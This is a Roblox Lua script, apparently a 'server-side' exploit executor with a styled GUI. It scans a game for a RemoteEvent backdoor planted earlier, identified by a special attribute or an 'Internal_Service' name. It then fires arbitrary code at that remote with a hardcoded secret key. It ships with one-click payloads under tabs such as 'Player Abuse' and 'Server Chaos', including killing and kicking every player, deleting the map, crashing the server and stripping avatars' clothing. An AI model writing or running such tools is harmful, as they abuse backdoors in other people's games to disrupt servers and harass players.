--[[ 
    PRABBBZ MASTER SS v5.0 - ULTIMATE MULTI-TAB
    Design: Dark Gradient / Neon Glassmorphism
    Features: Draggable Icon, Multi-Category, Auto-Scanner
]]

local SECRET_KEY = "PRABBBZ_SECRET_KEY_99"
local FoundRemote = nil

-- 1. FUNGSI SCANNER
local function ScanForBackdoor()
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and (v:GetAttribute("SystemKey") == "PRABBBZ_VERIFIED" or v.Name:find("Internal_Service")) then
            FoundRemote = v
            return true
        end
    end
    return false
end

-- 2. UI CONSTRUCTION
local UI = Instance.new("ScreenGui", game:GetService("CoreGui"))
UI.Name = "PrabbbzSupreme_v5"

-- ICON DRAGGABLE (PRBZ KOTAK)
local IconButton = Instance.new("TextButton", UI)
IconButton.Size = UDim2.new(0, 50, 0, 50)
IconButton.Position = UDim2.new(0, 50, 0.5, -25)
IconButton.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
IconButton.Text = "PRBZ"
IconButton.TextColor3 = Color3.fromRGB(0, 255, 255)
IconButton.Font = Enum.Font.GothamBold
IconButton.Active = true
IconButton.Draggable = true -- Bisa digeser ke mana saja

local IconCorner = Instance.new("UICorner", IconButton)
local IconStroke = Instance.new("UIStroke", IconButton)
IconStroke.Color = Color3.fromRGB(0, 255, 255)
IconStroke.Thickness = 2

-- MAIN PANEL
local Main = Instance.new("Frame", UI)
Main.Size = UDim2.new(0, 650, 0, 450)
Main.Position = UDim2.new(0.5, -325, 0.5, -225)
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- Base for Gradient
Main.Visible = false
Main.Active = true
Main.Draggable = true

local MainGradient = Instance.new("UIGradient", Main)
MainGradient.Color = ColorSequence.new(Color3.fromRGB(10, 10, 15), Color3.fromRGB(25, 25, 40))
MainGradient.Rotation = 45

local MainCorner = Instance.new("UICorner", Main); MainCorner.CornerRadius = UDim.new(0, 12)
local MainStroke = Instance.new("UIStroke", Main); MainStroke.Color = Color3.fromRGB(0, 255, 255); MainStroke.Thickness = 1.5

-- SIDEBAR (Kategori)
local Sidebar = Instance.new("Frame", Main)
Sidebar.Size = UDim2.new(0, 140, 1, -60)
Sidebar.Position = UDim2.new(0, 10, 0, 50)
Sidebar.BackgroundTransparency = 1

local SidebarLayout = Instance.new("UIListLayout", Sidebar); SidebarLayout.Padding = UDim.new(0, 5)

-- CONTAINER UNTUK SCRIPT (Kanan)
local ScriptContainer = Instance.new("Frame", Main)
ScriptContainer.Position = UDim2.new(0, 160, 0, 50)
ScriptContainer.Size = UDim2.new(1, -170, 1, -100)
ScriptContainer.BackgroundTransparency = 1

-- HEADER & CLOSE
local CloseBtn = Instance.new("TextButton", Main)
CloseBtn.Text = "X"
CloseBtn.Size = UDim2.new(0, 35, 0, 35)
CloseBtn.Position = UDim2.new(1, -45, 0, 10)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
CloseBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", CloseBtn)

-- FUNGSI TOGGLE
IconButton.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible end)
CloseBtn.MouseButton1Click:Connect(function() Main.Visible = false end)

-- SISTEM TAB & SCRIPT LIBRARY
local Tabs = {}
local function CreateTab(name)
    local frame = Instance.new("ScrollingFrame", ScriptContainer)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 1
    frame.Visible = false
    frame.ScrollBarThickness = 3
    frame.CanvasSize = UDim2.new(0, 0, 5, 0)
    Instance.new("UIListLayout", frame).Padding = UDim.new(0, 5)
    
    local btn = Instance.new("TextButton", Sidebar)
    btn.Size = UDim2.new(1, 0, 0, 40)
    btn.Text = name
    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    btn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", btn)
    
    btn.MouseButton1Click:Connect(function()
        for _, t in pairs(Tabs) do t.Visible = false end
        frame.Visible = true
    end)
    
    Tabs[name] = frame
    return frame
end

local MainTab = CreateTab("Main Admin")
local PlayerTab = CreateTab("Player Abuse")
local ServerTab = CreateTab("Server Chaos")
local VisualTab = CreateTab("Fun & Visual")

-- FUNGSI EKSEKUSI
local function Run(code)
    if FoundRemote then
        FoundRemote:FireServer(SECRET_KEY, code)
    end
end

local function AddLib(tab, name, code)
    local b = Instance.new("TextButton", tab)
    b.Size = UDim2.new(0.95, 0, 0, 40)
    b.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    b.Text = " > " .. name
    b.TextColor3 = Color3.fromRGB(0, 255, 255)
    b.TextXAlignment = 0
    Instance.new("UICorner", b)
    b.MouseButton1Click:Connect(function() Run(code) end)
end

-- DATA SCRIPT (Siap Pakai & Work)
-- Main Admin
AddLib(MainTab, "Kill All", "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end")
AddLib(MainTab, "Btools for All", "for _,p in pairs(game.Players:GetPlayers()) do Instance.new('HopperBin',p.Backpack).BinType=4 end")
AddLib(MainTab, "Kick All Players", "for _,p in pairs(game.Players:GetPlayers()) do if p ~= game.Players.LocalPlayer then p:Kick('PRABBBZ SS') end end")

-- Player Abuse
AddLib(PlayerTab, "Explode All", "for _,p in pairs(game.Players:GetPlayers()) do local e = Instance.new('Explosion',p.Character.Head); e.Position=p.Character.Head.Position end")
AddLib(PlayerTab, "Freeze Everyone", "for _,p in pairs(game.Players:GetPlayers()) do p.Character.HumanoidRootPart.Anchored = true end")
AddLib(PlayerTab, "Naked Players", "for _,p in pairs(game.Players:GetPlayers()) do for _,v in pairs(p.Character:GetChildren()) do if v:IsA('Shirt') or v:IsA('Pants') then v:Destroy() end end end")

-- Server Chaos
AddLib(ServerTab, "Delete Map", "workspace:ClearAllChildren()")
AddLib(ServerTab, "Crash Server", "while true do end")
AddLib(ServerTab, "Lock All Parts", "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('Part') then v.Anchored = true end end")

-- Fun & Visual
AddLib(VisualTab, "Rainbow Sky", "while wait() do game.Lighting.Ambient = Color3.fromHSV(tick()%5/5,1,1) end")
AddLib(VisualTab, "Big Head All", "for _,p in pairs(game.Players:GetPlayers()) do p.Character.Head.Size = Vector3.new(5,5,5) end")
AddLib(VisualTab, "Disco Lights", "while wait(0.1) do game.Lighting.OutdoorAmbient = Color3.new(math.random(),math.random(),math.random()) end")

-- SCANNER STARTUP
MainTab.Visible = true
task.spawn(function() ScanForBackdoor() end)
